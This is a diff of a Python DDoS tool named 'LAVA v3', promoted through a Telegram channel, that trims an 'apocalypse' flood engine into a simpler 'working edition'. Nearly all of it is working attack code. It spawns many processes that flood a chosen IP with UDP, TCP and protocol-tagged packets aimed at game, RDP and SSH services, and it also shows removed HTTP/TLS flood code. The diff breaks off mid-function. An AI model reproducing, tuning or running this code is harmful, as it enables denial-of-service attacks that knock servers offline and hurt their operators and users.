@@ -1,331 +1,177 @@
 #!/usr/bin/env python3
-# ╔══════════════════════════════════════════════════════════════════════════════╗
-# ║  LAVA v3 APOCALYPSE — 1000+ Thread Nuclear Mode                            ║
-# ║  10,000 PPS/thread × 1000 = 10M PPS — 100Gbps+ Capable                    ║
-# ╚══════════════════════════════════════════════════════════════════════════════╝
-
 import os
 import sys
 import time
 import socket
 import random
-import struct
-import string
 import threading
 import multiprocessing
-import ctypes
-import signal
-import re
-import mmap
-import fcntl
-import array
 import gc
-import resource
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  ANSI COLOR ENGINE
-# ═══════════════════════════════════════════════════════════════════════════════
-
+# Colors
 class C:
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-    DIM = '\033[2m'
-    ITALIC = '\033[3m'
-    UNDERLINE = '\033[4m'
-    BLINK = '\033[5m'
-    
-    BLACK = '\033[30m'
-    RED = '\033[31m'
-    GREEN = '\033[32m'
-    YELLOW = '\033[33m'
-    BLUE = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN = '\033[36m'
-    WHITE = '\033[37m'
-    
-    BRIGHT_BLACK = '\033[90m'
-    BRIGHT_RED = '\033[91m'
-    BRIGHT_GREEN = '\033[92m'
-    BRIGHT_YELLOW = '\033[93m'
-    BRIGHT_BLUE = '\033[94m'
-    BRIGHT_MAGENTA = '\033[95m'
-    BRIGHT_CYAN = '\033[96m'
-    BRIGHT_WHITE = '\033[97m'
-    
-    BG_BLACK = '\033[40m'
-    BG_RED = '\033[41m'
-    BG_GREEN = '\033[42m'
-    BG_YELLOW = '\033[43m'
-    BG_BLUE = '\033[44m'
-    BG_MAGENTA = '\033[45m'
-    BG_CYAN = '\033[46m'
-    BG_WHITE = '\033[47m'
-    
+    RESET='\033[0m'; BOLD='\033[1m'; RED='\033[91m'; GREEN='\033[92m'
+    YELLOW='\033[93m'; BLUE='\033[94m'; MAGENTA='\033[95m'; CYAN='\033[96m'
+    WHITE='\033[97m'; BRIGHT_BLACK='\033[90m'
     @staticmethod
-    def rgb(r, g, b):
-        return f'\033[38;2;{r};{g};{b}m'
-    
-    @staticmethod
-    def bg_rgb(r, g, b):
-        return f'\033[48;2;{r};{g};{b}m'
+    def rgb(r,g,b): return f'\033[38;2;{r};{g};{b}m'
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  DOTTED BANNER
-# ═══════════════════════════════════════════════════════════════════════════════
-
-DOTTED_BANNER = [
+BANNER = [
     ".:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: : :....:.: :.:....:.: :.:....:.: .......:.: :......:..............................:..........:..",
     "   .:...:........:.:..............................:....... . ........ .......... .......... .......... .........................................",
     "   .:.:.:.::.:.:.:.:....:.. ..:..:.:.:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: ..:....:.: :..........:.:....:.:..........:......:..........:..",
-    "   .....:........:.:.             .....:....... .......... .......... :......... .......... ....................................................",
-    "   .:.:.:.::.:.:.:..     .:.:      ..:.:.:..:.:.:.:.:..:.: :.:.:..:.: :.:....:.: :.:..:.:.:.:.:....:.:.:.:....:.................................",
-    "   .....:.........      ....................... ..:....... .......... :......... .......... .......... .........................................",
-    "   .:.:.:.::.:.: .      ..:.:.:..:.:.:.:.:..:.:.:.:....... ...   .:.: :.:....:.: .........: ..................:............. ......   ..........",
-    "   .....:.......       .......:..................               ..... :.........       ....      ....... .............              ............",
-    "   .:.:.:.::.:.:       .:.:.:.:..:.:.:.:.:..:..      ..         ..:.: :.:.....        ....       .....    ....:.:..      ...        .............",
-    "   ...:.:......       ......................      :.....       ...... :.:..          .....             ..........     ......        ............",
-    "   .:.:.:.:..:.       ..:.:.:.:..:.:.:.:.:.     ..:.:..:      .:..:.: :.:.   ..      ...:.           ..:.......      ....:...     ..............",
-    "   .:...:.....       .........:........:.       ..:....      ........ .   ....      .......       .... ......       .......       ..............",
-    "   .:.:.:.::.:       ...:.:.:.:..:.:.:.:.     ..:.:.:.       :.:..:.:     ...:      ....:.:     ...:.. ......      .......       ...............",
-    "   ...:.:....      ...........:.. ......     .. . ..         ........ . .....      ........     ............      ......         ...... ........",
-    "   .:.:.:.:.      ...::.:.:.:.:.   ..: .     .:.:.:   .      :.:.   . :.:....      :....:.    :..:.:.:.:...       ......        ..:..    .......",
-    "   ......                        .....        .     ..            ... :.:....        ..     .......... ....        .     .              ........",
-    "   .:.:                          :.:.:..           .:.           .:.: :.:....               :......:.......            ...            ..........",
-    "   .... .......:.:..... . . . .......:....  . . ..:..... . . ........ ..:....... . .  . ... .......... ...... . . . ........ . . ................",
-    "   .:.:.:.:..:.:.:.:.::.:.:.:.:..:.:.:.:.:..:.:.:.:.:..:.: :.:....:.. :.:....:.: ..:....:.:........:..............................:.............",
-    "   .....:.........................................:....... . ........ :......... .......... ....................................................",
 ]
 
-def print_dotted_banner():
-    PURPLE = C.rgb(160, 32, 240)
-    for line in DOTTED_BANNER:
-        print(f"{PURPLE}{C.BOLD}{line}{C.RESET}")
+def print_banner():
+    P = C.rgb(160,32,240)
+    for line in BANNER:
+        print(f"{P}{C.BOLD}{line}{C.RESET}")
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  UI
-# ═══════════════════════════════════════════════════════════════════════════════
-
-def print_header():
+def print_main():
+    os.system('clear')
     print(f"{C.CYAN}TELEGRAM: [T.He/LavaV2]{C.RESET}    {C.MAGENTA}CHANNEL: [T.He/LavaV2]{C.RESET}")
+    print()
+    print_banner()
+    print()
+    print(f"        Welcome to Lava (V3) — {C.RED}WORKING EDITION{C.RESET}")
+    print(f"        {C.GREEN}Simple UDP flood — No broken socket options{C.RESET}")
+    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for help){C.RESET}")
+    print()
+    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")
 
-def print_main_screen():
-    os.system('clear' if os.name != 'nt' else 'cls')
-    print_header()
+def print_methods():
+    os.system('clear')
+    print(f"{C.YELLOW}# Lava Method Page{C.RESET}")
     print()
-    print_dotted_banner()
+    print_banner()
     print()
-    print(f"        Welcome to Lava (V3) — APOCALYPSE MODE")
-    print(f"        {C.BRIGHT_GREEN}10,000 PPS/Thread — 1000+ Thread Support — 100Gbps+ Capable{C.RESET}")
-    print(f"{C.BRIGHT_BLACK}        (Type \"?\" for the help page){C.RESET}")
+    print(f"{C.YELLOW}## {C.CYAN}(UDP){C.RESET}")
+    print(f"  - {C.WHITE}U-GBPS{C.RESET}    {C.GREEN}→ UDP Bandwidth Flood{C.RESET}")
+    print(f"  - {C.WHITE}U-PPS{C.RESET}     {C.GREEN}→ UDP Packet Flood{C.RESET}")
     print()
-    print_prompt()
+    print(f"{C.YELLOW}## {C.CYAN}(TCP){C.RESET}")
+    for m in ['S-SUBN','S-FIVE','S-T53','S-JAVA','S-DISC','S-RDP','S-GAME','S-SAMP','S-SSH']:
+        print(f"  - {C.WHITE}{m}{C.RESET}")
+    print()
+    print(f"{C.YELLOW}## {C.CYAN}(TIPS){C.RESET}")
+    print(f"  - port 0 uses random ports")
+    print(f"  - Use: U-GBPS <IP> <PORT> <DURATION> <THREADS>")
+    print()
+    print(f"{C.GREEN}[media-abh{C.RESET}@{C.MAGENTA}Lava{C.RESET}]{C.RESET}")
 
-def print_prompt():
-    print(f"{C.BRIGHT_GREEN}[media-abh{C.RESET}@{C.BRIGHT_MAGENTA}Lava{C.RESET}]{C.RESET}")
-
-def print_methods_screen():
-    os.system('clear' if os.name != 'nt' else 'cls')
-    
-    print(f"{C.BRIGHT_YELLOW}# Lava Method Page {C.BRIGHT_BLACK}• {C.BRIGHT_GREEN}Power Status [APOCALYPSE]{C.RESET}")
-    print()
-    print_dotted_banner()
-    print()
-    
-    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(UDP){C.RESET}")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}U-GBPS{C.RESET}    {C.BRIGHT_BLACK}→{C.RESET} {C.BRIGHT_GREEN}100Gbps+ Bandwidth Flood (10k PPS/thread){C.RESET}")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}U-PPS{C.RESET}     {C.BRIGHT_BLACK}→{C.RESET} {C.BRIGHT_GREEN}50M+ Packets/sec Flood{C.RESET}")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}T-PASS{C.RESET}    {C.BRIGHT_BLACK}→{C.RESET} {C.BRIGHT_GREEN}TCP Handshake Flood (1M+ conn/s){C.RESET}")
-    print()
-    
-    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(TCP){C.RESET}")
-    for method in ['S-SUBN', 'S-FIVE', 'S-T53', 'S-JAVA', 'S-DISC', 'S-RDP', 'S-GAME', 'S-SAMP', 'S-SSH']:
-        print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}{method}{C.RESET}")
-    print()
-    
-    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(HTTP){C.RESET}")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}H-TLS{C.RESET}     {C.BRIGHT_BLACK}→{C.RESET} {C.BRIGHT_GREEN}HTTPS GET Flood (500k req/s){C.RESET}")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} {C.BRIGHT_WHITE}H-EMU{C.RESET}     {C.BRIGHT_BLACK}→{C.RESET} {C.BRIGHT_GREEN}Browser Emulation Flood{C.RESET}")
-    print()
-    
-    print(f"{C.BRIGHT_YELLOW}## {C.CYAN}(TIPS){C.RESET}")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} port 0 uses all ports (make sure to try this)")
-    print(f"  {C.BRIGHT_BLACK}-{C.RESET} port on H-methods does not matter")
-    print(f"  {C.BRIGHT_YELLOW}-{C.RESET} {C.BRIGHT_YELLOW}Use threads = 1000+ for maximum nuclear power{C.RESET}")
-    print(f"  {C.BRIGHT_YELLOW}-{C.RESET} {C.BRIGHT_YELLOW}Example: U-GBPS 1.2.3.4 0 60 1000{C.RESET}")
-    print()
-    
-    print_prompt()
-
-def print_attack_sent(target, port, duration, method, threads):
-    os.system('clear' if os.name != 'nt' else 'cls')
-    
+def print_attack(target, port, duration, method, threads):
+    os.system('clear')
     print(f"{C.CYAN}╔══════════════════════════════════════════════════════════════╗{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}           {C.BRIGHT_WHITE}! ☢ NUCLEAR ATTACK SENT ☢ !{C.RESET}                    {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Target:{C.RESET}    [{C.BRIGHT_WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Port:{C.RESET}      [{C.BRIGHT_WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Duration:{C.RESET}  [{C.BRIGHT_WHITE}{duration}{C.RESET}]                                {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Method:{C.RESET}    [{C.BRIGHT_WHITE}{method.lower().replace('_', '-')}{C.RESET}]                              {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Threads:{C.RESET}   [{C.BRIGHT_WHITE}{threads}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Sent In:{C.RESET}   [{C.BRIGHT_WHITE}{time.time():.6f}s{C.RESET}]                         {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}   {C.BRIGHT_CYAN}Sent By:{C.RESET}   [{C.BRIGHT_WHITE}media-abh{C.RESET}]                             {C.CYAN}║{C.RESET}")
-    print(f"{C.CYAN}║{C.RESET}                                                              {C.CYAN}║{C.RESET}")
+    print(f"{C.CYAN}║{C.RESET}           {C.RED}! Attack Sent !{C.RESET}                              {C.CYAN}║{C.RESET}")
+    print(f"{C.CYAN}║{C.RESET}   Target:    [{C.WHITE}{target}{C.RESET}]                              {C.CYAN}║{C.RESET}")
+    print(f"{C.CYAN}║{C.RESET}   Port:      [{C.WHITE}{port}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
+    print(f"{C.CYAN}║{C.RESET}   Duration:  [{C.WHITE}{duration}s{C.RESET}]                               {C.CYAN}║{C.RESET}")
+    print(f"{C.CYAN}║{C.RESET}   Method:    [{C.WHITE}{method}{C.RESET}]                              {C.CYAN}║{C.RESET}")
+    print(f"{C.CYAN}║{C.RESET}   Threads:   [{C.WHITE}{threads}{C.RESET}]                                  {C.CYAN}║{C.RESET}")
     print(f"{C.MAGENTA}╚══════════════════════════════════════════════════════════════╝{C.RESET}")
     print()
-    print_prompt()
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  APOCALYPSE ATTACK ENGINE — 1000+ Threads — 100Gbps+
-# ═══════════════════════════════════════════════════════════════════════════════
+# ===================================================================
+# SIMPLE WORKING ATTACK ENGINE — NO BROKEN OPTIONS
+# ===================================================================
 
-class ApocalypseAttackEngine:
+class AttackEngine:
     def __init__(self):
         self.processes = []
         self.active = False
         self.stats = {
             'packets': multiprocessing.Value('Q', 0),
-            'bytes': multiprocessing.Value('Q', 0),
-            'errors': multiprocessing.Value('Q', 0)
+            'bytes': multiprocessing.Value('Q', 0)
         }
         self.cpu_count = multiprocessing.cpu_count()
-        
-        # Increase system limits for 1000+ threads
-        try:
-            resource.setrlimit(resource.RLIMIT_NOFILE, (655350, 655350))
-        except:
-            pass
-    
-    def _generate_gbps_payload(self):
-        return random._urandom(65507)
-    
-    def _generate_pps_payload(self):
-        return random._urandom(64)
-    
-    def _set_cpu_affinity(self, core):
+
+    def udp_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
+        """Simple UDP flood worker"""
         try:
             os.sched_setaffinity(0, {core % self.cpu_count})
         except:
-            try:
-                import psutil
-                p = psutil.Process()
-                p.cpu_affinity([core % self.cpu_count])
-            except:
-                pass
-    
-    def _set_realtime_priority(self):
-        try:
-            os.nice(-20)
-        except:
-            pass
-        try:
-            resource.setrlimit(resource.RLIMIT_MEMLOCK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
-        except:
             pass
         
+        # Create socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
-            import ctypes
-            libc = ctypes.CDLL('libc.so.6')
-            SCHED_RR = 2
-            sched_param = ctypes.c_int(99)
-            libc.sched_setscheduler(0, SCHED_RR, ctypes.byref(sched_param))
-        except:
-            pass
-    
-    def _create_apocalypse_socket(self):
-        """Create socket optimized for 1000+ threads"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**28)
-            sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DONT)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_PRIORITY, 6)
-            
-            # Enable busy polling for lower latency
+        except:
+            pass
+        
+        # Pre-generate payload
+        payload = random._urandom(65507)
+        
+        # Ports for rotation
+        if port == 0:
+            ports = list(range(1, 65536))
+            random.shuffle(ports)
+            port_idx = 0
+        else:
+            ports = None
+        
+        end_time = time.time() + duration if duration > 0 else float('inf')
+        
+        while self.active and time.time() < end_time:
             try:
-                sock.setsockopt(socket.SOL_SOCKET, 0x1000, 1)
+                if ports:
+                    dst_port = ports[port_idx % len(ports)]
+                    port_idx += 1
+                else:
+                    dst_port = port
+                
+                sock.sendto(payload, (target, dst_port))
+                stats_pkt.value += 1
+                stats_bytes.value += len(payload)
             except:
                 pass
-            return sock
+
+    def udp_pps_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
+        """Simple UDP PPS flood"""
+        try:
+            os.sched_setaffinity(0, {core % self.cpu_count})
         except:
-            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-    # ─── UDP GBPS — 100Gbps+ BANDWIDTH ─────────────────────────────────────
-    def udp_gbps_worker(self, target, port, duration, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
-        self._set_cpu_affinity(core_id)
-        self._set_realtime_priority()
+            pass
         
-        sock = self._create_apocalypse_socket()
-        payload = self._generate_gbps_payload()
-        end_time = time.time() + duration if duration > 0 else float('inf')
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)
+        except:
+            pass
         
-        if port == 0:
-            ports = list(range(1, 65536))
-            random.shuffle(ports)
-            port_idx = 0
-        
-        # 10,000 PPS per thread target
-        pps_target = 10000
-        start_time = time.time()
-        packet_count = 0
-        
-        while self.active and time.time() < end_time:
-            try:
-                # Send 500 packets per iteration
-                for _ in range(500):
-                    if port == 0:
-                        dst_port = ports[port_idx % len(ports)]
-                        port_idx += 1
-                    else:
-                        dst_port = port
-                    
-                    sock.sendto(payload, (target, dst_port))
-                    stats_pkt.value += 1
-                    stats_bytes.value += len(payload)
-                    packet_count += 1
-            except:
-                stats_err.value += 1
-
-    # ─── UDP PPS — 50M+ PACKETS/SEC ─────────────────────────────────────────
-    def udp_pps_worker(self, target, port, duration, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
-        self._set_cpu_affinity(core_id)
-        self._set_realtime_priority()
-        
-        sock = self._create_apocalypse_socket()
-        payload = self._generate_pps_payload()
-        end_time = time.time() + duration if duration > 0 else float('inf')
+        payload = b'\x00' * 64
         
         if port == 0:
             ports = list(range(1, 65536))
             random.shuffle(ports)
             port_idx = 0
         
-        # 20,000 PPS per thread for small packets
+        end_time = time.time() + duration if duration > 0 else float('inf')
+        
         while self.active and time.time() < end_time:
             try:
-                # Send 1000 packets per iteration
-                for _ in range(1000):
-                    if port == 0:
-                        dst_port = ports[port_idx % len(ports)]
-                        port_idx += 1
-                    else:
-                        dst_port = port
-                    
-                    sock.sendto(payload, (target, dst_port))
-                    stats_pkt.value += 1
-                    stats_bytes.value += len(payload)
+                if ports:
+                    dst_port = ports[port_idx % len(ports)]
+                    port_idx += 1
+                else:
+                    dst_port = port
+                
+                sock.sendto(payload, (target, dst_port))
+                stats_pkt.value += 1
+                stats_bytes.value += len(payload)
             except:
-                stats_err.value += 1
-    
-    # ─── TCP BASS — HAND SHAKE FLOOD ───────────────────────────────────────
-    def tcp_bass_worker(self, target, port, duration, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
-        self._set_cpu_affinity(core_id)
-        self._set_realtime_priority()
+                pass
+
+    def tcp_worker(self, target, port, duration, wid, core, stats_pkt, stats_bytes):
+        """Simple TCP flood"""
+        try:
+            os.sched_setaffinity(0, {core % self.cpu_count})
+        except:
+            pass
         
-        end_time = time.time() + duration if duration > 0 else float('inf')
         payload = random._urandom(1024)
+        end_time = time.time() + duration if duration > 0 else float('inf')
         
         while self.active and time.time() < end_time:
             try:
@@ -337,227 +183,156 @@ class ApocalypseAttackEngine:
                 stats_pkt.value += 1
                 stats_bytes.value += len(payload)
             except:
-                stats_err.value += 1
-    
-    # ─── SPECIAL METHODS ────────────────────────────────────────────────────
-    def special_worker(self, target, port, duration, method, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
-        self._set_cpu_affinity(core_id)
-        self._set_realtime_priority()
+                pass
+
+    def special_worker(self, target, port, duration, method, wid, core, stats_pkt, stats_bytes):
+        """Special methods"""
+        try:
+            os.sched_setaffinity(0, {core % self.cpu_count})
+        except:
+            pass
         
-        end_time = time.time() + duration if duration > 0 else float('inf')
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**26)
+        except:
+            pass
         
         payloads = {
-            'S-SUBN': b'\xff\xff\xff\xff' + random._urandom(65503),
+            'S-SUBN': b'\xff' * 65507,
             'S-FIVE': b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x0a' * 500,
-            'S-T53': b'\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x00' + random._urandom(1000),
-            'S-JAVA': b'\xfe\x01\xfa\x00\x0b\x00\x4d\x00\x43\x00\x7c\x00' + random._urandom(1000),
-            'S-DISC': b'\x00\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1400),
-            'S-RDP': b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00' + random._urandom(1000),
-            'S-GAME': random._urandom(1400),
-            'S-SAMP': b'\x53\x41\x4d\x50\x03\x70\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31' + random._urandom(1000),
-            'S-SSH': b'\x53\x53\x48\x2d\x32\x2e\x30\x2d\x4f\x70\x65\x6e\x53\x53\x48\x5f\x38\x2e\x39' + random._urandom(1000),
+            'S-T53': b'\x54\x53\x33' + b'\x00' * 1000,
+            'S-JAVA': b'\xfe\x01\xfa' + b'\x00' * 1000,
+            'S-DISC': b'\x00' * 1400,
+            'S-RDP': b'\x03\x00' + b'\x00' * 1000,
+            'S-GAME': b'\x00' * 1400,
+            'S-SAMP': b'\x53\x41\x4d\x50' + b'\x00' * 1000,
+            'S-SSH': b'\x53\x53\x48' + b'\x00' * 1000,
         }
-        
-        payload = payloads.get(method, random._urandom(1400))
-        sock = self._create_apocalypse_socket()
+        payload = payloads.get(method, b'\x00' * 1400)
         
         if port == 0:
             ports = list(range(1, 65536))
             random.shuffle(ports)
             port_idx = 0
         
-        while self.active and time.time() < end_time:
-            try:
-                for _ in range(500):
-                    if port == 0:
-                        dst_port = ports[port_idx % len(ports)]
-                        port_idx += 1
-                    else:
-                        dst_port = port
-                    sock.sendto(payload, (target, dst_port))
-                    stats_pkt.value += 1
-                    stats_bytes.value += len(payload)
-            except:
-                stats_err.value += 1
-    
-    # ─── HTTP WORKER ─────────────────────────────────────────────────────────
-    def http_worker(self, target, port, duration, method, worker_id, core_id, stats_pkt, stats_bytes, stats_err):
-        self._set_cpu_affinity(core_id)
-        self._set_realtime_priority()
-        
         end_time = time.time() + duration if duration > 0 else float('inf')
         
-        uas = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        ]
-        
-        paths = ['/', '/index.html', '/api/v1', '/login', '/admin', '/home']
-        host = target.split(':')[0]
-        
-        # Pre-build requests
-        req_templates = []
-        for ua in uas:
-            for path in paths:
-                req = (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {host}\r\n"
-                    f"User-Agent: {ua}\r\n"
-                    f"Accept: */*\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
-                    f"\r\n"
-                ).encode()
-                req_templates.append(req)
-        
         while self.active and time.time() < end_time:
             try:
-                req = random.choice(req_templates)
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((target, port))
-                
-                if method == 'H-TLS' or port == 443:
-                    import ssl
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    s = ctx.wrap_socket(s, server_hostname=target)
-                
-                s.send(req)
+                if ports:
+                    dst_port = ports[port_idx % len(ports)]
+                    port_idx += 1
+                else:
+                    dst_port = port
+                sock.sendto(payload, (target, dst_port))
                 stats_pkt.value += 1
-                stats_bytes.value += len(req)
-                s.close()
+                stats_bytes.value += len(payload)
             except:
-                stats_err.value += 1
-    
-    # ─── LAUNCH ──────────────────────────────────────────────────────────────
-    def launch(self, method, target, port, duration, threads=None):
+                pass
+
+    def launch(self, method, target, port, duration, threads=100):
         self.stop()
         self.active = True
-        
-        if threads is None:
-            threads = 1000  # Default to 1000 threads
         
         try:
             target_ip = socket.gethostbyname(target)
         except:
             target_ip = target
         
-        print_attack_sent(target, port, duration, method, threads)
+        print_attack(target, port, duration, method, threads)
         
-        worker_map = {
-            'U-GBPS': self.udp_gbps_worker,
-            'U-PPS': self.udp_pps_worker,
-            'T-PASS': self.tcp_bass_worker,
-            'T-BASS': self.tcp_bass_worker,
-            'H-TLS': self.http_worker,
-            'H-EMU': self.http_worker,
-        }
-        
-        if method.startswith('S-'):
-            worker_func = self.special_worker
+        # Select worker
+        if method == 'U-GBPS':
+            worker = self.udp_worker
+        elif method == 'U-PPS':
+            worker = self.udp_pps_worker
+        elif method.startswith('S-'):
+            worker = self.special_worker
         else:
-            worker_func = worker_map.get(method, self.udp_gbps_worker)
+            worker = self.udp_worker
         
-        monitor = threading.Thread(target=self._monitor, args=(duration, threads))
+        # Monitor thread
+        monitor = threading.Thread(target=self._monitor, args=(duration,))
         monitor.daemon = True
         monitor.start()
         
-        processes_to_spawn = threads
+        print(f"{C.CYAN}[+] Launching {threads} threads...{C.RESET}")
         
-        print(f"{C.BRIGHT_CYAN}[+] Launching {processes_to_spawn} workers across {self.cpu_count} cores{C.RESET}")
-        print(f"{C.BRIGHT_GREEN}[+] Target: {target_ip}:{port} | Method: {method} | Duration: {duration}s{C.RESET}")
-        print(f"{C.BRIGHT_MAGENTA}[+] ☢ APOCALYPSE MODE — {threads} Threads — 100Gbps+ CAPABLE ☢{C.RESET}")
-        print(f"{C.BRIGHT_YELLOW}[+] Theoretical Max: {threads * 10000:,} PPS = {threads * 10000 * 65507 * 8 / 1e9:.1f} Gbps{C.RESET}")
-        print(f"{C.BRIGHT_RED}[+] ⚡ NUCLEAR FISSION ENGAGED ⚡{C.RESET}")
-        print()
-        
-        for i in range(processes_to_spawn):
-            core_id = i % self.cpu_count
+        # Spawn processes
+        for i in range(threads):
+            core = i % self.cpu_count
             p = multiprocessing.Process(
-                target=worker_func,
-                args=(target_ip, port, duration, i, core_id, 
-                      self.stats['packets'], self.stats['bytes'], self.stats['errors'])
+                target=worker,
+                args=(target_ip, port, duration, i, core,
+                      self.stats['packets'], self.stats['bytes'])
             )
             p.daemon = True
             p.start()
             self.processes.append(p)
-            
-            # Show progress for large thread counts
-            if i % 100 == 0 and i > 0:
-                print(f"\r{C.BRIGHT_BLACK}[+] Spawning threads: {i}/{processes_to_spawn}{C.RESET}", end="")
-        
-        print(f"\r{C.BRIGHT_GREEN}[+] All {processes_to_spawn} threads launched!{C.RESET}")
-        print()
         
         if duration > 0:
             time.sleep(duration)
             self.stop()
-    
-    def _monitor(self, duration, threads):
+
+    def _monitor(self, duration):
         start = time.time()
-        last_pkts = 0
-        last_bytes = 0
-        max_gbps = 0
+        last_p = 0
+        last_b = 0
+        peak = 0
         
         while self.active:
             time.sleep(1)
             elapsed = time.time() - start
-            pkts = self.stats['packets'].value
-            bytes_total = self.stats['bytes'].value
-            errors = self.stats['errors'].value
+            p = self.stats['packets'].value
+            b = self.stats['bytes'].value
             
-            pps = pkts / elapsed if elapsed > 0 else 0
-            gbps = (bytes_total * 8) / (elapsed * 1_000_000_000) if elapsed > 0 else 0
+            if elapsed > 0:
+                pps = p / elapsed
+                gbps = (b * 8) / (elapsed * 1e9)
+            else:
+                pps = 0
+                gbps = 0
             
-            current_pkts = pkts - last_pkts
-            current_bytes = bytes_total - last_bytes
-            current_gbps = (current_bytes * 8) / 1_000_000_000
-            current_pps = current_pkts
+            cp = p - last_p
+            cb = b - last_b
+            cg = (cb * 8) / 1e9 if cb > 0 else 0
+            if cg > peak:
+                peak = cg
             
-            if current_gbps > max_gbps:
-                max_gbps = current_gbps
+            last_p = p
+            last_b = b
             
-            last_pkts = pkts
-            last_bytes = bytes_total
-            
-            status_line = (
-                f"\r{C.BRIGHT_CYAN}[☢LAVA]{C.RESET} "
-                f"{C.BRIGHT_GREEN}Pkts:{C.RESET}{pkts:>12,} "
-                f"{C.BRIGHT_YELLOW}PPS:{C.RESET}{pps:>8,.0f} "
-                f"{C.BRIGHT_MAGENTA}BW:{C.RESET}{gbps:>6.2f}Gbps "
-                f"{C.BRIGHT_CYAN}Cur:{C.RESET}{current_gbps:>5.2f}Gbps "
-                f"{C.BRIGHT_WHITE}Peak:{C.RESET}{max_gbps:>5.2f}Gbps "
-                f"{C.BRIGHT_RED}Err:{C.RESET}{errors:>6,} "
-                f"{C.BRIGHT_BLACK}Time:{C.RESET}{elapsed:>4.0f}s{C.RESET}"
-            )
-            print(status_line, end="", flush=True)
+            status = (f"\r{C.CYAN}[LAVA]{C.RESET} "
+                     f"{C.GREEN}Pkts:{C.RESET}{p:>10,} "
+                     f"{C.YELLOW}PPS:{C.RESET}{pps:>8,.0f} "
+                     f"{C.MAGENTA}BW:{C.RESET}{gbps:>5.2f}Gbps "
